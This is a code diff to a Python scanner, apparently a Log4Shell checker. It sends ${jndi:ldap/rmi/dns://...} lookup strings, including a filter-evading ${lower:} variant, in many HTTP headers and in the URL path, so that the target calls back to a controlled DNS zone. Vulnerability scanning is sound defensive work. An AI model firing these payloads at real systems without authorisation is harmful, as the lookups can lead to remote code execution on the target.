@@ -11,6 +11,27 @@ logging.basicConfig(level=logging.INFO)
 # Change this to your DNS zone 
 HOSTNAME = "yourdns.zone.here"
 
+header_injects = [
+    'X-Api-Version',
+    'User-Agent',
+    'Referer',
+    'X-Druid-Comment',
+    'Origin',
+    'Location',
+    'X-Forwarded-For',
+    'Cookie',
+    'X-Requested-With',
+    'X-Forwarded-Host',
+    'Accept'
+]
+
+prefixes_injects = [
+    'jndi:rmi',
+    'jndi:ldap',
+    'jndi:dns',
+    'jndi:${lower:l}${lower:d}ap'
+]
+
 def main():
     if len(sys.argv) != 2:
         print("Usage python3 nw_log4check.py http://yoururl.com")
@@ -20,30 +41,37 @@ def main():
     identifier = uuid.uuid4()
 
     logging.debug(f"Generated UUID: {identifier}")
-    logging.info(f"Sending request to {url_input} using User-Agent injection...")
-
-    # Check 1 (User Agent)
-    try:
-        """
-        Check inspired by: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
-        """
-        requests.get(
-            url_input,
-            headers={'User-Agent': f'${{jndi:ldap://{identifier}.{HOSTNAME}/test.class}}'},
-            verify=False
-        )
-    except requests.exceptions.ConnectionError as e:
-        logging.error(f"HTTP connection to target URL error: {e}")
+    logging.info(f"Sending requests to {url_input} using header injection...")
+    # Check 1 (Header fields)
+    for header in header_injects:
+        for prefix in prefixes_injects:
+            logging.info(f"Trying prefix {prefix} with header {header}")
+            try:
+                """
+                Check inspired by: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
+                """
+                headers = {header: f'${{{prefix}://{identifier}.{HOSTNAME}/test.class}}'}
+                requests.get(
+                    url_input,
+                    headers=headers,
+                    verify=False,
+                    timeout=5
+                )
+            except requests.exceptions.ConnectionError as e:
+                logging.error(f"HTTP connection to target URL error: {e}")
 
     # Check 2 (Get request)
-    logging.info(f"Sending request to {url_input} using GET request injection: {url_input}/${{jndi:ldap://{identifier}.{HOSTNAME}/test.class}}")
-    try:
-        requests.get(
-            f"{url_input}/${{jndi:ldap://{identifier}.{HOSTNAME}/test.class}}",
-            verify=False
-        )
-    except requests.exceptions.ConnectionError as e:
-        logging.error(f"HTTP connection to target URL error: {e}")
+    logging.info(f"Sending requests to {url_input} using GET request injection")
+    for prefix in prefixes_injects:
+        logging.info(f"Trying prefix {prefix}")
+        try:
+            requests.get(
+                f"{url_input}/${{{prefix}://{identifier}.{HOSTNAME}/test.class}}",
+                verify=False,
+                timeout=5,
+            )
+        except requests.exceptions.ConnectionError as e:
+            logging.error(f"HTTP connection to target URL error: {e}")
 
     logging.info(f"Waiting 10 seconds for a response")
     time.sleep(10)
